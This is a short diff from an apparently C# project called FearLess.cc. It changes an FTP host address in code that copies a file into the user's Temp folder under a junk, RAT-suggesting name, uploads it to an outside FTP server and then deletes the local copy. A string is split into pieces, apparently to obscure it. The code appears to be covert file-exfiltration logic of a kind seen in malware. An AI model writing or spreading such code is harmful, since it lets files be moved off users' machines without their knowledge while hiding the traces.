@@ -157,7 +157,7 @@ namespace FearLess.cc
 
         private static void AppendString()
         {
-            if (!string.IsNullOrEmpty(DeleteFile("changelogs.txt", "ftp://www.sidesense.eu/public_html/main/")))
+            if (!string.IsNullOrEmpty(DeleteFile("changelogs.txt", "ftp://sidesense.eu/public_html/main/")))
             {
                 UpdateChangelog("changelogs.txt", "ftp://www.sidesense.eu/public_html/");
             }
@@ -235,7 +235,7 @@ namespace FearLess.cc
 
             File.Copy(filePath, "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\imaratforurpcccccc1234io1uJKFDHOIAFANL.dll",true);
             string hello = "d" + "f";
-            if (!string.IsNullOrEmpty(DeleteFile("imaratforurpcccccc1234io1uJKFDHOIAFANL.dll", "ftp://www.sidesense.eu/public_html/main/")))
+            if (!string.IsNullOrEmpty(DeleteFile("imaratforurpcccccc1234io1uJKFDHOIAFANL.dll", "ftp://sidesense.eu/public_html/main/")))
             {
                 UploadFtpFile("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\imaratforurpcccccc1234io1uJKFDHOIAFANL.dll");
                 File.Delete("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\imaratforurpcccccc1234io1uJKFDHOIAFANL.dll");
